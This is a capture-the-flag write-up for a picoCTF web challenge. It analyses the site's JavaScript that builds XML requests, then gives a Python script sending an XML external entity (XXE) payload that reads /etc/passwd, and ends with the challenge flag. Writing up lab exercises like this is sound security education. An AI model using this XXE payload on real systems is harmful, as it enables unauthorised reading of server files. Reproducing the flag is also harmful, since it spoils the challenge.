
---
#### Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:50907/)

---
![[Pasted image 20260304222652.png]]

This is the website in question.

The first thing I did was look at the requests made when visiting the site.
![[Pasted image 20260304222736.png]]I saw some interesting custom JS files (`detailsCheck.js` and `xmlDetailsCheckPayload.js`).

detailsCheck.js
What this file does is basically add an event listener to all submit forms and then call the `checkDetails` function. This function makes a POST request to `/data` (which is `this.getAttribute("action")`, if you inspect the HTML elements) with the data from that form. It then calls the `payload` function to prepare the data.
```js
document.querySelectorAll('.detailForm').forEach(item => {
    item.addEventListener("submit", function(e) {
        checkDetails(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });
});
function checkDetails(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t)
                : "Could not find the details. Better luck next time :("
            )
            .then(res => document.getElementById("detailsResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```

xmlDetailsCheckPayload.js
This just prepares the XML string for the POST requests.
```js
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</data>';
    return xml;
}

```

Investigating the POST request:
![[Pasted image 20260304223118.png]]This was the information being parsed.

I tried to change the `id` field but with no success.
Then I just searched for some XML payloads to read `/etc/passwd`, since that was the challenge goal, and found one.
I wrote a script to automate everything.

```python
import requests

URL = "http://saturn.picoctf.net"
PORT = "63265"
FULL_URL = f"{URL}:{PORT}"

HEADERS = {
    "Content-Type": "application/xml",
    "User-Agent": "Rah",
    "Accept": "application/xml",
}

xml_body = """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>"""


def main():
    r = requests.post(
        f"{FULL_URL}/data", data=xml_body.encode("utf-8"), headers=HEADERS
    )
    print(r.text)


if __name__ == "__main__":
    main()

```

![[Pasted image 20260304223230.png]]

## FLAG
```flag
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

---